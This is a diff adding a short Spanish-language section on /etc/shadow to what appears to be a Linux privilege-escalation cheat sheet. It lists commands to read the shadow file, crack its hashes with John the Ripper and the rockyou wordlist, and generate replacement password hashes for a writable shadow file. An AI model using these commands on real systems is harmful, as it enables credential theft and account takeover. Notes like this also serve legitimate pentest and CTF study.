@@ -14,6 +14,37 @@ Dejo por aquí el comando principal a la hora de entrar en una máquina linux
 id
 ```
 
+## /etc/shadow
+
+### Lectura
+
+```
+ls -l /etc/shadow
+cat /etc/shadow
+```
+
+Si encontramos un usuario o hash pass podemos utilizar john
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+### Escritura
+
+```
+ls -l /etc/shadow
+mkpasswd -m sha-512 pass
+```
+
+O otra
+
+````
+openssl passwd newpasswordhere
+```
+
+
+
+
 
 
 
